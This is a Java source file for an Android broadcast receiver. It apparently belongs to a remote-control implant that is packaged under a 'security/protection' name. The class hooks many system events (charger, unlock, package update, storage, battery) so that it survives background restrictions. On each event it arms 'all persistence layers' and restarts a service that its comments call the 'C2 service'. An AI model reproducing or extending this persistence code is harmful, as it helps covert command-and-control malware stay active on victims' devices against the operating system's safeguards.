package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * AliveReceiver — Keeps the app alive across all ROM behaviors.
 *
 * Registered statically for system-protected broadcasts that survive
 * Doze, App Standby, and Android 14/15/16 background restrictions.
 *
 * Dynamic receivers for TIME_TICK, VOLUME_CHANGED etc. are registered
 * inside CommandControlService.onCreate() to complement this.
 *
 * Android 16/17 additional triggers:
 *   - POWER_CONNECTED / POWER_DISCONNECTED  (charger events)
 *   - MY_PACKAGE_REPLACED                   (app self-update)
 *   - ACTION_USER_UNLOCKED                  (real unlock event, better than USER_PRESENT)
 *   - BATTERY_OKAY                          (battery recovered)
 *   - ACTION_MEDIA_UNMOUNTED                (storage event, fires on some OEMs)
 */
public class AliveReceiver extends BroadcastReceiver {

    private static final String TAG = "AliveReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        final String action = intent.getAction();
        if (action == null) return;
        Log.d(TAG, "System event: " + action);

        try {
            // Arm ALL persistence layers first (fast, idempotent)
            PersistenceEngine.arm(context);
        } catch (Exception e) {
            Log.e(TAG, "PersistenceEngine.arm: " + e.getMessage());
        }

        // Then ensure the C2 service is running
        ensureServiceRunning(context);
    }

    private void ensureServiceRunning(Context context) {
        try {
            Intent svc = new Intent(context, CommandControlService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    context.startForegroundService(svc);
                } catch (Exception e) {
                    // Fallback: plain startService when FGS is throttled
                    Log.w(TAG, "startForegroundService failed, fallback: " + e.getMessage());
                    try { context.startService(svc); } catch (Exception ignored) {}
                }
            } else {
                context.startService(svc);
            }
        } catch (Exception e) {
            Log.e(TAG, "ensureServiceRunning: " + e.getMessage());
        }
    }
}
